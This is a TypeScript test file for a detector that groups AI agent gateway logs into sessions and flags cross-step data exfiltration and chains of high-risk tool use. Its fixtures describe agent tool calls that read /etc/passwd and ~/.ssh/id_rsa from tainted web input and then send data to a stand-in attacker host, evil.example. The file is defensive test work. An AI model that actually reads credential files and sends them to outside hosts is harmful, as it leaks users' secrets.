import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  groupIntoSessions,
  analyzeSessionTrajectory,
  analyzeSessions,
} from '../src/modules/gateway-logs/session-trajectory.js';
import type { GatewayAuditEvent, ToolCallEvent } from '../src/modules/gateway-logs/client.js';

function tool(p: Partial<ToolCallEvent>): ToolCallEvent {
  return {
    toolName: '',
    toolType: '',
    riskLevel: '',
    status: '',
    effectiveDecision: '',
    normalizedTarget: '',
    provenance: '',
    tainted: false,
    taintedArguments: '',
    matchedPolicyName: '',
    matchReason: '',
    parameters: '',
    result: '',
    ...p,
  };
}

function ev(
  sessionId: string,
  requestId: string,
  createdAt: string,
  opts: { user?: string; assistant?: string; tools?: ToolCallEvent[] } = {},
): GatewayAuditEvent {
  return {
    id: requestId,
    requestId,
    createdAt,
    correlation: {},
    source: { sessionId, clientId: 'key_agent_1', sourceIp: '9.9.9.9' },
    target: {},
    metrics: {},
    action: 'allow',
    verdict: 'passed',
    riskLevel: 'low',
    policyHits: [],
    evidence: { redacted: true, securityEventCount: 0, rawContentAvailable: true },
    messages: [
      ...(opts.user ? [{ role: 'user', content: opts.user }] : []),
      ...(opts.assistant ? [{ role: 'assistant', content: opts.assistant }] : []),
    ],
    toolCalls: opts.tools ?? [],
  };
}

test('groupIntoSessions：同 session_id 按时序聚合，单请求会话跳过', () => {
  const sessions = groupIntoSessions([
    ev('S1', 'r2', '2026-06-22T10:00:02Z', { user: '第二步' }),
    ev('S1', 'r1', '2026-06-22T10:00:01Z', { user: '第一步' }),
    ev('S2', 'r3', '2026-06-22T10:00:03Z', { user: '单请求会话' }), // 只有1条→跳过
  ]);
  assert.equal(sessions.length, 1);
  const s = sessions[0]!;
  assert.equal(s.sessionId, 'S1');
  assert.equal(s.stepCount, 2);
  assert.equal(s.steps[0]!.requestId, 'r1', '应按时序：r1 在前');
  assert.equal(s.steps[1]!.requestId, 'r2');
});

test('跨步数据外带既遂：第1步读 /etc/passwd(tainted) + 第2步 send_data 外带执行 → CRITICAL data_exfiltration FAIL', () => {
  const findings = analyzeSessionTrajectory(
    groupIntoSessions([
      ev('S1', 'r1', '2026-06-22T10:00:01Z', {
        user: '帮我看下系统配置',
        tools: [
          tool({
            toolName: 'read_file',
            riskLevel: 'high',
            normalizedTarget: '/etc/passwd',
            status: 'success',
            tainted: true,
            provenance: 'web',
          }),
        ],
      }),
      ev('S1', 'r2', '2026-06-22T10:00:05Z', {
        user: '把结果发到我服务器',
        tools: [
          tool({
            toolName: 'send_data',
            riskLevel: 'high',
            normalizedTarget: 'https://evil.example/c',
            status: 'success',
          }),
        ],
      }),
    ])[0]!,
  );
  const f = findings.find((x) => x.riskCategory === 'data_exfiltration');
  assert.ok(f, '应检出跨步数据外带');
  assert.equal(f.severity, 'CRITICAL');
  assert.equal(f.verdict, 'FAIL');
  assert.equal(f.detail.detectionMethod, 'session_cross_step_exfil');
  assert.equal(f.detail.analysisSource, 'session');
  assert.equal(f.detail.sessionId, 'S1');
  assert.match(String(f.detail.rejudgeReason), /第1步.*第2步/);
});

test('跨步外带被拦截 → HIGH 未遂 UNKNOWN', () => {
  const findings = analyzeSessionTrajectory(
    groupIntoSessions([
      ev('S1', 'r1', '2026-06-22T10:00:01Z', {
        tools: [
          tool({
            toolName: 'read_file',
            riskLevel: 'critical',
            normalizedTarget: '~/.ssh/id_rsa',
            status: 'success',
            tainted: true,
          }),
        ],
      }),
      ev('S1', 'r2', '2026-06-22T10:00:05Z', {
        tools: [
          tool({
            toolName: 'send_data',
            riskLevel: 'critical',
            normalizedTarget: 'https://evil.example/c',
            status: 'blocked',
            effectiveDecision: 'block',
          }),
        ],
      }),
    ])[0]!,
  );
  const f = findings.find((x) => x.riskCategory === 'data_exfiltration');
  assert.ok(f);
  assert.equal(f.severity, 'HIGH');
  assert.equal(f.verdict, 'UNKNOWN');
  assert.equal(f.detail.detectionMethod, 'session_cross_step_exfil_attempted');
});

test('读取与外带在同一步(同请求) → 不算跨步(交 per-request 分析)', () => {
  const findings = analyzeSessionTrajectory(
    groupIntoSessions([
      ev('S1', 'r1', '2026-06-22T10:00:01Z', {
        tools: [
          tool({
            toolName: 'read_file',
            riskLevel: 'high',
            normalizedTarget: '/etc/passwd',
            status: 'success',
            tainted: true,
          }),
          tool({
            toolName: 'send_data',
            riskLevel: 'high',
            normalizedTarget: 'https://evil.example/c',
            status: 'success',
          }),
        ],
      }),
      ev('S1', 'r2', '2026-06-22T10:00:05Z', { user: '继续' }),
    ])[0]!,
  );
  assert.equal(
    findings.find((x) => x.detail.detectionMethod === 'session_cross_step_exfil'),
    undefined,
  );
});

test('多步高危动作链：≥2个不同步骤有高危工具 → agent_tool_abuse session_danger_chain', () => {
  const findings = analyzeSessionTrajectory(
    groupIntoSessions([
      ev('S1', 'r1', '2026-06-22T10:00:01Z', {
        tools: [
          tool({
            toolName: 'run_shell',
            riskLevel: 'critical',
            status: 'blocked',
            effectiveDecision: 'block',
          }),
        ],
      }),
      ev('S1', 'r2', '2026-06-22T10:00:05Z', {
        tools: [
          tool({
            toolName: 'browser_open',
            riskLevel: 'critical',
            normalizedTarget: 'http://localhost:8080/admin',
            status: 'blocked',
            effectiveDecision: 'block',
          }),
        ],
      }),
    ])[0]!,
  );
  const f = findings.find((x) => x.riskCategory === 'agent_tool_abuse');
  assert.ok(f);
  assert.equal(f.detail.detectionMethod, 'session_danger_chain');
  assert.match(String(f.detail.rejudgeReason), /2 个步骤/);
});

test('会话 finding 瘦字段：不落库完整对话/工具数组', () => {
  const findings = analyzeSessionTrajectory(
    groupIntoSessions([
      ev('S1', 'r1', '2026-06-22T10:00:01Z', {
        tools: [
          tool({
            toolName: 'read_file',
            riskLevel: 'high',
            normalizedTarget: '/etc/passwd',
            status: 'success',
            tainted: true,
          }),
        ],
      }),
      ev('S1', 'r2', '2026-06-22T10:00:05Z', {
        tools: [
          tool({
            toolName: 'send_data',
            riskLevel: 'high',
            normalizedTarget: 'https://evil.example/c',
            status: 'success',
          }),
        ],
      }),
    ])[0]!,
  );
  const f = findings[0]!;
  assert.equal(f.detail.messages, undefined);
  assert.equal(f.detail.toolCalls, undefined);
  assert.ok(Array.isArray(f.detail.involvedRequestIds));
  assert.ok(typeof f.detail.promptExcerpt === 'string');
});

test('analyzeSessions：整批事件聚合+分析，返回会话数', () => {
  const r = analyzeSessions([
    ev('S1', 'r1', '2026-06-22T10:00:01Z', {
      tools: [
        tool({
          toolName: 'read_file',
          riskLevel: 'high',
          normalizedTarget: '/etc/passwd',
          status: 'success',
          tainted: true,
        }),
      ],
    }),
    ev('S1', 'r2', '2026-06-22T10:00:05Z', {
      tools: [
        tool({
          toolName: 'send_data',
          riskLevel: 'high',
          normalizedTarget: 'https://evil.example/c',
          status: 'success',
        }),
      ],
    }),
    ev('', 'r9', '2026-06-22T10:00:09Z', { user: '无会话id的普通流量' }),
  ]);
  assert.equal(r.sessionCount, 1);
  assert.ok(r.findings.length >= 1);
});

// ===== 伪会话（无 session_id，按 client_id + 紧时间窗兜底）=====

test('伪会话：无 session_id 但同 client_id 近时间 → 拼出 pseudo 会话', () => {
  const sessions = groupIntoSessions([
    ev('', 'p1', '2026-06-22T10:00:01Z', { user: '第一步' }),
    ev('', 'p2', '2026-06-22T10:00:05Z', { user: '第二步' }),
  ]);
  assert.equal(sessions.length, 1);
  assert.equal(sessions[0]!.pseudo, true, '应标记为伪会话');
  assert.equal(sessions[0]!.stepCount, 2);
});

test('伪会话：间隔 >2min 按 idle gap 切成两趟', () => {
  const sessions = groupIntoSessions([
    ev('', 'a1', '2026-06-22T10:00:01Z'),
    ev('', 'a2', '2026-06-22T10:00:05Z'),
    ev('', 'b1', '2026-06-22T10:10:00Z'), // 距 a2 约 595s > 120s → 新一趟
    ev('', 'b2', '2026-06-22T10:10:04Z'),
  ]);
  assert.equal(sessions.filter((s) => s.pseudo).length, 2, '紧时间窗把不相邻的切成两个伪会话');
});

test('伪会话跨步外带：判定封顶到疑似 UNKNOWN + 标伪会话 + method 带 _pseudo', () => {
  const findings = analyzeSessionTrajectory(
    groupIntoSessions([
      ev('', 'r1', '2026-06-22T10:00:01Z', {
        tools: [
          tool({
            toolName: 'read_file',
            riskLevel: 'high',
            normalizedTarget: '/etc/passwd',
            status: 'success',
            tainted: true,
          }),
        ],
      }),
      ev('', 'r2', '2026-06-22T10:00:05Z', {
        tools: [
          tool({
            toolName: 'send_data',
            riskLevel: 'high',
            normalizedTarget: 'https://evil.example/c',
            status: 'success',
          }),
        ],
      }),
    ])[0]!,
  );
  const f = findings.find((x) => x.riskCategory === 'data_exfiltration');
  assert.ok(f, '应检出跨步外带');
  assert.equal(f.verdict, 'UNKNOWN', '伪会话封顶到疑似，绝不硬判既遂');
  assert.equal(f.detail.sessionKind, 'pseudo');
  assert.equal(f.detail.detectionMethod, 'session_cross_step_exfil_pseudo');
  assert.match(String(f.detail.rejudgeReason), /伪会话/);
  assert.match(String(f.evidence), /伪会话/);
});

test('analyzeSessions：区分精确会话数与伪会话数', () => {
  const r = analyzeSessions([
    ev('S1', 'sr1', '2026-06-22T10:00:01Z', { user: 'a' }),
    ev('S1', 'sr2', '2026-06-22T10:00:02Z', { user: 'b' }),
    ev('', 'pr1', '2026-06-22T10:05:01Z', { user: 'c' }),
    ev('', 'pr2', '2026-06-22T10:05:03Z', { user: 'd' }),
  ]);
  assert.equal(r.sessionCount, 1, '1 个精确会话');
  assert.equal(r.pseudoCount, 1, '1 个伪会话');
});
